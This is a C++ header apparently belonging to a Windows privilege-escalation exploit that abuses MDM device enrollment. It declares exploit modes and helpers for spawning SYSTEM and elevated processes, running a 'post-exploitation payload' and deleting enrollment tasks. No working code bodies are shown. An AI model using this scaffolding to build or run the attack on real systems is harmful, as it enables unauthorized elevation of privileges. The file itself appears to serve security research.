#pragma once

//Common header approach, not very efficient from compile time perspective, but really convenient for small projects
#include <vector>
#include <string>
#include <windows.h>
#include <roapi.h>
#include <wrl/client.h>
#include <wrl/wrappers/corewrappers.h>
#include <Windows.Foundation.h>
#include <Windows.Foundation.Collections.h>
#include <Windows.Storage.Streams.h>

#pragma comment(lib, "mdmregistration.lib")
#pragma comment(lib, "wtsapi32.lib")
#pragma comment(lib, "runtimeobject.lib")

using namespace Microsoft::WRL;
using namespace Microsoft::WRL::Wrappers;
using namespace ABI::Windows::Foundation;
using namespace ABI::Windows::Foundation::Collections;

// Common defines
typedef std::vector<SID_AND_ATTRIBUTES> TCaps;
typedef std::vector<std::wstring> TStrings;
static const wchar_t* mdm_only_argument = L"--mdm-registration-only";
static const wchar_t* unenrollment_argument = L"--mdm-unenrollment";
static const wchar_t* enroll_webservice_argument = L"--enroll-webservice";
static const wchar_t* exploit_argument = L"--exploit";

static const wchar_t* exploit_aad_mdm_enrollment = L"aad_mdm_enrollment";
static const wchar_t* exploit_whitelisted_mdm_enrollment = L"whitelisted_mdm_enrollment";
static const wchar_t* exploit_sched_tasks_delete = L"mdm_sched_tasks";


//Common Helpers
bool GetParsedArguments(
  bool& is_mdm_enrollment_only_present,
  bool& unenrollment_present,
  std::wstring& target_exploit,
  std::wstring& enroll_mdm_webservice);
bool GetSecurityCapabilitiesForLowboxToken(TCaps& sidCaps);
bool EnrollIntoMDM(const std::wstring& enroll_email, const std::wstring& mdm_enroll_webservice_url);
bool UnenrollFromMDM();
bool IsAppContainer();
bool IsAdminToken();
bool IsAdminPresentToken();
bool WaitUntilDeviceIsMDMEnrolled();
bool ExecutePrivilegedCmdPayload();
bool CreateSystemProcess(const std::wstring& executable_path);
bool CreateWhitelistedAppContainerProcess(
  const std::wstring& executable_commandline,
  const std::wstring& enroll_webservice,
  const std::wstring& enroll_upn);
bool CreateElevatedProcessFromMediumIL(
  const std::wstring& executable_path,
  const std::wstring& username,
  const std::wstring& password);
bool PerformDeviceEnrollmentUsingWhitelistedProcess(const std::wstring& enroll_mdm_webservice, const std::wstring& enroll_upn);
bool GetCurrentExecutablePath(std::wstring& path);
bool GetEnrollmentIDs(TStrings& enrollment_ids, const wchar_t* upn = L"");
void GetListOfEnrollmentTasksByEnrollmentID(const std::wstring& enrollment_id, TStrings& enrollment_tasks);
bool GetListOfEnrollmentTasks(TStrings& enrollment_tasks);
void BlockWaitForMDMPolicyEnforcement();
bool ExecutePostExploitationPayload(bool is_enroll_only_mdm_requested, const std::wstring& target_exploit);
std::wstring GetRunningUsername();
HRESULT PrintError(HRESULT hr);


//ReflectedEnroller helpers
HRESULT EnrollAADUsingReflectedEnroller(
  const std::wstring& upn,
  const std::wstring& discovery_service_full_url);

//Management Enroller helpers
HRESULT DeleteEnrollmentTask(const std::wstring& taskname);